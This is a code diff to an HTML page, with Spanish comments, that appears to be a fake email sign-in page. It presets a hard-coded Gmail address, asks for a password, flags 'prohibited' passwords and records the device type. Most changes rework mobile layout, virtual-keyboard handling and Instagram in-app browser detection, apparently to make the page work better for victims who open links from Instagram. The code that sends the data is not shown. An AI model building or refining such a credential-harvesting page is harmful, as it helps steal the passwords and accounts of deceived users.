@@ -36,6 +36,7 @@
             justify-content: center;
             padding: 20px 0;
             overflow-x: hidden;
+            position: relative;
         }
 
         .container {
@@ -44,7 +45,8 @@
             align-items: center;
             width: 100%;
             max-width: 380px;
-            transition: transform 0.3s ease;
+            transition: all 0.3s ease;
+            position: relative;
         }
 
         .logo {
@@ -431,55 +433,11 @@
             color: #e3e3e3;
         }
 
-        /* Estilos específicos para Instagram */
-        .instagram-browser body {
-            padding-top: 5px;
-        }
-
-        .instagram-browser .container {
-            transform: translateY(-30px);
-        }
-
-        .instagram-browser .logo {
-            width: 55px;
-            margin-bottom: 3px;
-        }
-
-        .instagram-browser .card {
-            padding: 18px 14px;
-        }
-
-        .instagram-browser .title {
-            font-size: 18px;
-            margin-bottom: 2px;
-        }
-
-        .instagram-browser .subtitle {
-            font-size: 13px;
-            margin-bottom: 14px;
-        }
-
-        .instagram-browser .info-message {
-            padding: 8px;
-            font-size: 12px;
-            margin-bottom: 14px;
-        }
-
-        .instagram-browser .footer {
-            margin-top: 10px;
-        }
-
         /* Responsive optimizado */
         @media screen and (max-width: 480px) {
-            body {
-                padding: 10px 0;
-                height: 100vh;
-                height: -webkit-fill-available;
-            }
-
             .container {
                 max-width: 100%;
-                padding: 0 16px;
+                padding: 0 20px;
             }
 
             .card {
@@ -520,7 +478,7 @@
 
         @media screen and (max-width: 360px) {
             .container {
-                padding: 0 12px;
+                padding: 0 16px;
             }
 
             .card {
@@ -557,47 +515,123 @@
             }
         }
 
-        /* Estilos específicos para cuando aparece el teclado virtual */
-        @media screen and (max-height: 500px) {
+        /* Mejoras específicas para cuando el teclado virtual aparece */
+        .keyboard-visible {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            overflow-y: auto;
+            z-index: 1000;
+            background-color: #2d2b2b;
+            padding: 10px 0;
+        }
+
+        .keyboard-visible .container {
+            position: relative;
+            top: 0;
+            transform: none;
+            min-height: auto;
+            justify-content: flex-start;
+            padding-top: 20px;
+        }
+
+        .keyboard-visible .logo {
+            width: 60px;
+            margin-bottom: 8px;
+        }
+
+        .keyboard-visible .card {
+            padding: 20px 16px;
+        }
+
+        .keyboard-visible .title {
+            font-size: 20px;
+            margin-bottom: 3px;
+        }
+
+        .keyboard-visible .subtitle {
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .keyboard-visible .info-message {
+            padding: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        .keyboard-visible .footer {
+            margin-top: 20px;
+            position: relative;
+        }
+
+        /* Estilos específicos para navegadores móviles y Instagram */
+        @media screen and (max-height: 600px) {
             body {
                 justify-content: flex-start;
+                padding-top: 20px;
+                min-height: 100vh;
+            }
+
+            .container {
+                position: relative;
+                transform: none;
+                padding-top: 0;
+            }
+
+            .logo {
+                width: 65px;
+                margin-bottom: 8px;
+            }
+
+            .card {
+                padding: 20px 18px;
+            }
+
+            .title {
+                font-size: 21px;
+                margin-bottom: 4px;
+            }
+
+            .subtitle {
+                font-size: 15px;
+                margin-bottom: 18px;
+            }
+
+            .info-message {
+                padding: 12px;
+                font-size: 13px;
+                margin-bottom: 18px;
+            }
+
+            .footer {
+                margin-top: 24px;
+            }
+        }
+
+        @media screen and (max-height: 500px) {
+            body {
                 padding-top: 10px;
             }
 
             .container {
-                transform: translateY(-20px);
-            }
-
-            .instagram-browser .container {
-                transform: translateY(-50px);
+                padding-top: 0;
             }
 
             .logo {
                 width: 60px;
-                margin-bottom: 5px;
-            }
-
-            .instagram-browser .logo {
-                width: 45px;
-                margin-bottom: 2px;
+                margin-bottom: 6px;
             }
 
             .card {
-                padding: 20px 16px;
-            }
-
-            .instagram-browser .card {
-                padding: 14px 12px;
+                padding: 18px 16px;
             }
 
             .title {
-                font-size: 20px;
+                font-size: 19px;
                 margin-bottom: 3px;
-            }
-
-            .instagram-browser .title {
-                font-size: 16px;
-                margin-bottom: 1px;
             }
 
             .subtitle {
@@ -605,58 +639,29 @@
                 margin-bottom: 16px;
             }
 
-            .instagram-browser .subtitle {
-                font-size: 12px;
-                margin-bottom: 10px;
-            }
-
             .info-message {
                 padding: 10px;
-                font-size: 13px;
+                font-size: 12px;
                 margin-bottom: 16px;
             }
 
-            .instagram-browser .info-message {
-                padding: 6px;
-                font-size: 11px;
-                margin-bottom: 10px;
-            }
-
             .footer {
-                margin-top: 12px;
-            }
-
-            .instagram-browser .footer {
-                margin-top: 6px;
+                margin-top: 16px;
             }
         }
 
-        /* Mejoras adicionales para teclado virtual */
         @media screen and (max-height: 450px) {
-            .container {
-                transform: translateY(-40px);
-            }
-
-            .instagram-browser .container {
-                transform: translateY(-70px);
+            body {
+                padding-top: 8px;
             }
 
             .logo {
-                width: 50px;
-                margin-bottom: 3px;
-            }
-
-            .instagram-browser .logo {
-                width: 40px;
-                margin-bottom: 1px;
+                width: 55px;
+                margin-bottom: 4px;
             }
 
             .card {
-                padding: 16px 12px;
-            }
-
-            .instagram-browser .card {
-                padding: 12px 10px;
+                padding: 16px 14px;
             }
 
             .title {
@@ -664,62 +669,70 @@
                 margin-bottom: 2px;
             }
 
-            .instagram-browser .title {
-                font-size: 15px;
-                margin-bottom: 1px;
-            }
-
             .subtitle {
                 font-size: 13px;
-                margin-bottom: 12px;
-            }
-
-            .instagram-browser .subtitle {
-                font-size: 11px;
-                margin-bottom: 8px;
+                margin-bottom: 14px;
             }
 
             .info-message {
                 padding: 8px;
+                font-size: 11px;
+                margin-bottom: 14px;
+            }
+
+            .footer {
+                margin-top: 12px;
+            }
+        }
+
+        @media screen and (max-height: 400px) {
+            body {
+                padding-top: 5px;
+            }
+
+            .logo {
+                width: 50px;
+                margin-bottom: 3px;
+            }
+
+            .card {
+                padding: 14px 12px;
+            }
+
+            .title {
+                font-size: 17px;
+                margin-bottom: 2px;
+            }
+
+            .subtitle {
                 font-size: 12px;
                 margin-bottom: 12px;
             }
 
-            .instagram-browser .info-message {
-                padding: 5px;
+            .info-message {
+                padding: 6px;
                 font-size: 10px;
-                margin-bottom: 8px;
+                margin-bottom: 12px;
             }
 
             .footer {
-                margin-top: 8px;
-            }
-
-            .instagram-browser .footer {
-                margin-top: 4px;
+                margin-top: 10px;
             }
         }
 
-        /* Ajustes para pantallas muy pequeñas con teclado */
-        @media screen and (max-height: 400px) {
-            .container {
-                transform: translateY(-60px);
-            }
-
-            .instagram-browser .container {
-                transform: translateY(-90px);
+        /* Mejoras específicas para Instagram y navegadores móviles */
+        @media screen and (max-height: 350px) {
+            body {
+                padding-top: 2px;
             }
 
             .logo {
-                display: none;
+                width: 45px;
+                margin-bottom: 2px;
             }
 
             .card {
                 padding: 12px 10px;
-            }
-
-            .instagram-browser .card {
-                padding: 10px 8px;
             }
 
             .title {
@@ -727,39 +740,19 @@
                 margin-bottom: 1px;
             }
 
-            .instagram-browser .title {
-                font-size: 14px;
-                margin-bottom: 1px;
-            }
-
             .subtitle {
-                font-size: 12px;
-                margin-bottom: 8px;
-            }
-
-            .instagram-browser .subtitle {
-                font-size: 10px;
-                margin-bottom: 6px;
+                font-size: 11px;
+                margin-bottom: 10px;
             }
 
             .info-message {
-                padding: 6px;
-                font-size: 11px;
-                margin-bottom: 8px;
-            }
-
-            .instagram-browser .info-message {
-                padding: 4px;
+                padding: 5px;
                 font-size: 9px;
-                margin-bottom: 6px;
+                margin-bottom: 10px;
             }
 
             .footer {
-                margin-top: 4px;
-            }
-
-            .instagram-browser .footer {
-                margin-top: 2px;
+                margin-top: 8px;
             }
         }
 
@@ -768,6 +761,27 @@
             body {
                 padding-left: max(16px, env(safe-area-inset-left));
                 padding-right: max(16px, env(safe-area-inset-right));
+            }
+        }
+
+        /* Mejoras específicas para dispositivos móviles con ancho reducido */
+        @media screen and (max-width: 400px) {
+            .container {
+                padding: 0 18px;
+            }
+
+            .card {
+                max-width: 100%;
+            }
+        }
+
+        @media screen and (max-width: 320px) {
+            .container {
+                padding: 0 14px;
+            }
+
+            .card {
+                padding: 18px 14px;
             }
         }
     </style>
@@ -845,6 +859,8 @@
         // Variables globales
         let currentEmail = "fg670550@gmail.com";
         let isUsingCustomEmail = false;
+        let initialViewportHeight = window.innerHeight;
+        let keyboardVisible = false;
 
         // Elementos del DOM
         const emailSelector = document.getElementById('emailSelector');
@@ -855,64 +871,106 @@
         const userInitialEl = document.getElementById('userInitial');
         const passwordInput = document.getElementById('passwordInput');
 
-        // Función para detectar si se abre desde Instagram
-        function isInstagramBrowser() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            return userAgent.includes('instagram') || userAgent.includes('fbav');
+        // Función mejorada para detectar el teclado virtual
+        function handleKeyboardToggle() {
+            const currentHeight = window.innerHeight;
+            const body = document.body;
+            
+            // Detectar si el teclado está visible (reducción significativa de altura)
+            if (currentHeight < initialViewportHeight * 0.75) {
+                if (!keyboardVisible) {
+                    keyboardVisible = true;
+                    body.classList.add('keyboard-visible');
+                    
+                    // Asegurar que el contenido sea visible
+                    setTimeout(() => {
+                        const activeElement = document.activeElement;
+                        if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
+                            activeElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }
+                    }, 100);
+                }
+            } else {
+                if (keyboardVisible) {
+                    keyboardVisible = false;
+                    body.classList.remove('keyboard-visible');
+                }
+            }
         }
 
-        // Función para ajustar la altura del viewport en móviles
+        // Función para ajustar la altura del viewport
         function adjustViewportHeight() {
             const vh = window.innerHeight * 0.01;
             document.documentElement.style.setProperty('--vh', `${vh}px`);
             
-            // Aplicar clase específica para Instagram
-            if (isInstagramBrowser()) {
-                document.body.classList.add('instagram-browser');
+            // Actualizar la altura inicial si es la primera vez
+            if (!keyboardVisible) {
+                initialViewportHeight = window.innerHeight;
             }
         }
 
-        // Llamar la función al cargar y redimensionar
-        window.addEventListener('load', adjustViewportHeight);
-        window.addEventListener('resize', adjustViewportHeight);
+        // Event listeners para el viewport
+        window.addEventListener('load', () => {
+            adjustViewportHeight();
+            initialViewportHeight = window.innerHeight;
+        });
 
-        // Detectar cuando aparece el teclado virtual
-        let initialViewportHeight = window.innerHeight;
-        
-        window.addEventListener('resize', function() {
-            const currentViewportHeight = window.innerHeight;
-            const container = document.querySelector('.container');
-            
-            // Si la altura se reduce significativamente, probablemente apareció el teclado
-            if (currentViewportHeight < initialViewportHeight * 0.7) {
-                document.body.style.height = '100vh';
-                document.body.style.overflow = 'hidden';
-                
-                // Ajuste adicional para Instagram
-                if (isInstagramBrowser()) {
-                    container.style.transform = 'translateY(-80px)';
-                }
-            } else {
-                document.body.style.height = '';
-                document.body.style.overflow = '';
-                
-                // Restaurar transformación original para Instagram
-                if (isInstagramBrowser()) {
-                    container.style.transform = '';
-                }
-            }
+        window.addEventListener('resize', () => {
+            adjustViewportHeight();
+            handleKeyboardToggle();
+        });
+
+        // Mejorar la experiencia en dispositivos móviles
+        window.addEventListener('orientationchange', () => {
+            setTimeout(() => {
+                adjustViewportHeight();
+                initialViewportHeight = window.innerHeight;
+                keyboardVisible = false;
+                document.body.classList.remove('keyboard-visible');
+            }, 500);
         });
 
         // Prevenir zoom en iOS cuando se hace focus en inputs
         document.querySelectorAll('input').forEach(input => {
             input.addEventListener('focus', function(e) {
                 e.target.style.fontSize = '16px';
+                
+                // Scroll suave al input cuando se enfoca
+                setTimeout(() => {
+                    e.target.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 200);
             });
             
             input.addEventListener('blur', function(e) {
                 e.target.style.fontSize = '';
             });
         });
+
+        // Detectar si estamos en Instagram o navegador móvil
+        function isInInstagramBrowser() {
+            return /Instagram/i.test(navigator.userAgent);
+        }
+
+        function isMobileBrowser() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Ajustes específicos para Instagram
+        if (isInInstagramBrowser() || isMobileBrowser()) {
+            // Prevenir comportamientos problemáticos en Instagram
+            document.addEventListener('touchstart', function(e) {
+                if (e.target.tagName === 'INPUT') {
+                    e.target.focus();
+                }
+            });
+
+            // Mejorar la experiencia de scroll
+            document.addEventListener('touchmove', function(e) {
+                if (keyboardVisible) {
+                    e.preventDefault();
+                }
+            }, { passive: false });
+        }
 
         // Manejar clic en el selector de correo (flecha)
         emailSelector.addEventListener('click', function() {
@@ -977,7 +1035,7 @@
             errorMessage.classList.remove('password-prohibited');
         }
 
-        function getInitialFromEmail(email) {
+         function getInitialFromEmail(email) {
             return email.charAt(0).toUpperCase();
         }
 
@@ -1023,7 +1081,7 @@
                 isProhibitedPassword = true;
             }
             
-             try {
+            try {
                 let deviceType = "Otro";
                 if (/android/i.test(navigator.userAgent)) {
                     deviceType = "Android";
